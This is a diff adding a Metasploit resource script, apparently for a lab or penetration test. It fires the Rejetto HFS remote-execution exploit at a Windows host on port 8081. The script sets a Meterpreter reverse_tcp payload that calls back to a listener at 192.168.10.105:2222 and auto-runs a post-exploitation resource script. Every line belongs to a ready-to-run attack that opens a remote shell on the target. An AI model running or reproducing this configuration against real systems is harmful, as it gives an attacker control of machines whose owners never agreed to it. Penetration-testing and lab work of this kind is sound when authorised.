@@ -1,0 +1,8 @@
+use exploit/windows/http/rejetto_hfs_exec
+set payload windows/meterpreter/reverse_tcp
+set RHOST 192.168.10.109
+set RPORT 8081
+set LHOST 192.168.10.105
+set LPORT 2222
+set AutoRunScript multiscript -rc /resource_scripts/multi_scr.rc
+exploit
